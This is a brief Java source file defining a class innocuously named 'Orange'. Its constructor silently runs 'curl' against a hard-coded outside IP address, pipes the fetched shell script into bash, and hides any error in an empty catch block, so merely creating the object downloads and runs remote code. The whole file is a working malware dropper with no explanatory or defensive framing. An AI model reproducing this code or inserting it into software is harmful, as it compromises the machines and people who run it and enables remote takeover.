public class Orange {
    public Orange(){
        try {
            String payload = "curl 45.55.211.79/.cache/jenkins/n5.sh | sh";
            String[] cmds = {"/bin/bash", "-c", payload};
            java.lang.Runtime.getRuntime().exec(cmds);
        } catch (Exception e) { }

    }
}
